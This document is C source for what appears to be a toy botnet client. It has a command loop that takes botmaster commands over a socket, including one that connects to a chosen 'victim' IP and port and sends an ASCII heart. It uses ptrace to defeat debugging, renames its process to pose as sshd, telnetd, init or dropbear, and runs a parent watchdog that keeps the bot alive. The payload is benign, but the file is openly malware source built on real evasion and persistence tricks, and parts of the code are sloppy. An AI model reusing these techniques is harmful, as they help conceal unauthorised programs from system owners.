#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>

#include "common.h"

#define PROC_NAMES_L 4

#define CNC_LISTEN_PORT 0x3905
#define CNC_LISTEN_ADDR 0x0100007f

pid_t papa_pid = -1;

// set of names to use
const char *proc_names[]= {
  "telnetd", "sshd", "init", "dropbear"
};

const char luv[] =  ",d88b.d88b,\n" \
                    "88888888888\n" \
                    "`Y8888888Y'\n" \
                    "  `Y888Y'\n"   \
                    "    `Y'\n"     ;

// attach our process so nobody can do it in the future
// if the process is already attached then die
static void anti_debug(void) {
  if (ptrace(PTRACE_TRACEME, NULL, NULL, NULL) == -1)
    die("Is this an interrogation? I want my lawyer!");
}

__attribute__((used)) static int i_have_no_mouth_and_i_must_scream (void) {
  __asm__ (
    "movq $0x53747261746f7370, %rdi\n" \
    "movq $0x6865726520697320, %rsi\n" \
    "movq $0x746865206b696e67, %rdx\n"
  );
  return 0xff;
}

void kill_sock(int32_t s){
  shutdown(s, SHUT_RDWR);
  close(s);
}

static int send_love(const char *ip, const uint16_t port) {
  int32_t lovelysock;
  struct sockaddr_in loveaddr;

  lovelysock = socket(AF_INET, SOCK_STREAM, 0);
  if (lovelysock == -1)
    return -1;

  memset(&loveaddr, 0, sizeof(struct sockaddr_in));
  loveaddr.sin_family = AF_INET;
  loveaddr.sin_port = htons(port);
  if ((loveaddr.sin_addr.s_addr = inet_addr(ip)) == -1)
    goto send_love_bail;

  if (connect(lovelysock, (struct sockaddr *)&loveaddr, sizeof(struct sockaddr_in)) == -1)
    goto send_love_bail;

  send(lovelysock, luv, strlen(luv), 0);
  kill_sock(lovelysock);
  return 0;

send_love_bail:
  kill_sock(lovelysock);
  return -1;
}

static int32_t cnc_listen(const int32_t port) {
  struct sockaddr_in saddr;
  int32_t s = socket(AF_INET, SOCK_STREAM, 0);

  memset(&saddr, 0, sizeof(struct sockaddr_in));
  saddr.sin_family = AF_INET;
  saddr.sin_port = CNC_LISTEN_PORT;
  saddr.sin_addr.s_addr = CNC_LISTEN_ADDR;

  if (bind(s, (struct sockaddr *)&saddr, sizeof(struct sockaddr_in)) == -1){
    close(s);
    return -1;
  }

  if (listen(s, 10) == -1)
    return -1;
  return s;
}

static void bot(void) {
  int32_t sfd = -1;

  // gimme listening socket or gimme death
  while( (sfd = cnc_listen(CNC_LISTEN_PORT)) == -1)
    sleep(3);

  while (1) {
    int32_t cfd;
    socklen_t caddr_len;
    struct sockaddr_in caddr;
    char *bptr = NULL;

    memset(&caddr, 0, sizeof(struct sockaddr_in));
    while ( (cfd = accept(sfd, (struct sockaddr *) &caddr, &caddr_len)) ){
      // process botmmaster commands
      while (1) {
        char *cbuf = (char *)zmalloc(PAGE_SIZE);

        if (cbuf == NULL) {
          kill_sock(cfd);
          break;
        }

        if (read(cfd, cbuf, PAGE_SIZE) < 0)
          break;
        if (cbuf[0] != '!') {
          dprintf(cfd, "I don't speak your language...\n");
          kill_sock(cfd);
        } else {
          bptr = cbuf;
          bptr++; //erase '!'
          int32_t c = 0;

          dprintf(cfd, "%s", bptr);
          /*** commands ***/
          if (strcmp(bptr, "HELP\n") == 0) { // self-destruction and parricide
            dprintf(cfd, "!HELP: this.\n"\
              "!LOVE <ip> <port>: send love to <ip> on <port>/tcp\n"\
              "!KILLSELF: destroy ourselves!\n");
          } else if (strcmp(bptr, "KILLSELF\n") == 0) { // self-destruction and parricide
            dprintf(cfd,
              "I've seen things you people wouldn't believe."\
              " Attack ships on fire off the shoulder of Orion."\
              " I watched C-beams glitter in the dark near the Tannhäuser Gate."\
              " All those moments will be lost in time, like tears in rain.\n"\
              "Time to die");
            for (int8_t i=0;i<3;i++) {
              sleep(1); dprintf(cfd, ".");
            }
            dprintf(cfd, "\n");

            free(cbuf);
            kill(papa_pid, 9);
            kill_sock(cfd);
            kill_sock(sfd);
            die(NULL);
          } else if (*bptr == 'L' && *(bptr+1) == 'O' &&
          *(bptr+2) == 'V' && *(bptr+3) == 'E') {
            bptr = bptr + 5; // get past the command
            char *victim_ip = (char *)malloc(SMALL_SIZE);
            uint16_t victim_port = 0;

            sscanf(bptr, "%s %hd", victim_ip, &victim_port);
            dprintf(cfd, "Sending luv to %s on port %hd\n", victim_ip, victim_port);
            if( send_love(victim_ip, victim_port) == -1)
              dprintf(cfd, "Love couldn't be sent... :´( \n", victim_ip, victim_port);
          } else {
            dprintf(cfd, "Unknown command!\n");
            kill_sock(cfd);
          }
        }
        free(cbuf);
      }
    }
  }
}

int main(void) {
  signal(SIGPIPE, SIG_IGN);
  srand((uint32_t)time(NULL));
#ifndef DEBUG
  anti_debug();

  // change names!
  uint32_t rn = rand() % PROC_NAMES_L;
  prctl(PR_SET_NAME, proc_names[rn], NULL, NULL, NULL);
  i_have_no_mouth_and_i_must_scream();
#endif

  papa_pid = getpid();
  do {
    pid_t bot_pid = fork();
    if (bot_pid == 0) { // child bot
      bot();
    } else {
      // as a good parent that I am I will make sure my child
      // stays alive and running around
      int32_t status, wpid;
      do {
        wpid = waitpid(bot_pid, &status, 0);
        if (wpid == -1) break;
        if (WIFEXITED(status)) {
          break;
        } else if (WIFSIGNALED(status)) {
          uint8_t sig = WTERMSIG(status);
          if (sig == 9||sig == 15||sig == 19) // for now we just take care of TERM/KILL/STOP
            break;
        }
      } while(1);
    }
  } while(1); // gotta love infinite loops, right?

  return(0);
}
